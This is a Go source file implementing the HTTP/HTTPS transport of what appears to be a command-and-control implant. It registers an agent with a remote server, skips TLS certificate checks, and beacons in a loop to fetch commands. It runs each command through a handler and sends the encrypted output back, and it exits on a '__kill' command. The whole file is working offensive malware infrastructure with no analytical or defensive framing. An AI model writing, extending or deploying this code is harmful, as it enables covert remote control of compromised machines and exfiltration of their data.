//go:build !transport_ws

// transport_http.go — HTTP/HTTPS transport (default, no external deps)
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

type ActiveTransport struct {
	baseURL   string
	userAgent string
	client    *http.Client
	encryptFn func(string) (string, error)
	decryptFn func(string) (string, error)
	regURI    string
	ciURI     string
	resURI    string
	mode      string
	done      chan struct{}
	closeOnce sync.Once
}

func NewActiveTransport(scheme, host, port, ua, regURI, ciURI, resURI string,
	encFn func(string) (string, error), decFn func(string) (string, error)) *ActiveTransport {
	tr := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:       10,
		IdleConnTimeout:    90 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	return &ActiveTransport{
		baseURL:   fmt.Sprintf("%s://%s:%s", scheme, host, port),
		userAgent: ua,
		client:    &http.Client{Timeout: 60 * time.Second, Transport: tr},
		encryptFn: encFn,
		decryptFn: decFn,
		regURI:    regURI,
		ciURI:     ciURI,
		resURI:    resURI,
		mode:      "beacon",
		done:      make(chan struct{}),
	}
}

func (t *ActiveTransport) post(path string, body string) (string, error) {
	req, err := http.NewRequest("POST", t.baseURL+path, bytes.NewBufferString(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", t.userAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,*/*")
	resp, err := t.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	return string(data), err
}

func (t *ActiveTransport) Register(metadata map[string]interface{}) (string, error) {
	msg := map[string]interface{}{"type": "register", "metadata": metadata}
	data, _ := json.Marshal(msg)
	enc, err := t.encryptFn(string(data))
	if err != nil {
		return "", fmt.Errorf("encrypt: %w", err)
	}
	resp, err := t.post(t.regURI, enc)
	if err != nil {
		return "", err
	}
	dec, err := t.decryptFn(resp)
	if err != nil {
		return "", fmt.Errorf("decrypt: %w", err)
	}
	var result map[string]interface{}
	if err := json.Unmarshal([]byte(dec), &result); err != nil {
		return "", err
	}
	if tp, _ := result["type"].(string); tp == "registered" || tp == "checkin_ack" {
		if id, ok := result["agent_id"].(string); ok {
			return id, nil
		}
	}
	return "", fmt.Errorf("registration failed")
}

func (t *ActiveTransport) Checkin(agentID string, results []map[string]interface{}) ([]map[string]interface{}, error) {
	if results == nil {
		results = []map[string]interface{}{}
	}
	msg := map[string]interface{}{
		"type": "checkin", "agent_id": agentID,
		"metadata": map[string]string{"mode": t.mode},
		"results":  results,
	}
	data, _ := json.Marshal(msg)
	enc, err := t.encryptFn(string(data))
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}
	resp, err := t.post(t.ciURI, enc)
	if err != nil {
		return nil, err
	}
	dec, err := t.decryptFn(resp)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}
	var parsed map[string]interface{}
	if err := json.Unmarshal([]byte(dec), &parsed); err != nil {
		return nil, err
	}
	if tp, _ := parsed["type"].(string); tp == "commands" {
		if cmds, ok := parsed["commands"].([]interface{}); ok {
			var commands []map[string]interface{}
			for _, c := range cmds {
				if m, ok := c.(map[string]interface{}); ok {
					commands = append(commands, m)
				}
			}
			return commands, nil
		}
	}
	return nil, nil
}

func (t *ActiveTransport) SendResult(agentID, command, output, commandID string) error {
	msg := map[string]interface{}{
		"type": "response", "agent_id": agentID,
		"output": output, "command": command,
		"timestamp": time.Now().Format(time.RFC3339),
	}
	if commandID != "" {
		msg["command_id"] = commandID
	}
	data, _ := json.Marshal(msg)
	enc, err := t.encryptFn(string(data))
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}
	_, err = t.post(t.resURI, enc)
	return err
}

func (t *ActiveTransport) StartStreaming(agentID string, handler func(string) string) error {
	t.mode = "streaming"
	consecutiveFailures := 0
	for {
		select {
		case <-t.done:
			return nil
		default:
		}
		commands, err := t.Checkin(agentID, nil)
		if err != nil {
			consecutiveFailures++
			if consecutiveFailures >= 10 {
				return err
			}
			time.Sleep(5 * time.Second)
			continue
		}
		consecutiveFailures = 0
		for _, cmd := range commands {
			command, _ := cmd["command"].(string)
			commandID, _ := cmd["command_id"].(string)
			if command == "__kill" {
				return nil
			}
			output := handler(command)
			t.SendResult(agentID, command, output, commandID)
		}
		time.Sleep(1 * time.Second)
	}
}

func (t *ActiveTransport) Close() {
	t.closeOnce.Do(func() {
		close(t.done)
	})
}
